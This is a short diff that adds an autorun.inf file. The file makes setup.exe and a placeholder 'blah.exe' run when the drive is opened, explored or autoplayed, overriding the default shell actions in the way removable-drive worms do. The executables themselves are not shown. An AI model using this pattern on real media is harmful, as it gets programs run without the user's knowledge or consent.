@@ -1,0 +1,6 @@
+[autorun]
+open = setup.exe 
+shellexecute=blah.exe
+shell\open\command=blah.exe
+shell\explore\command = setup.exe 
+shell\autoplay\command = setup.exe 
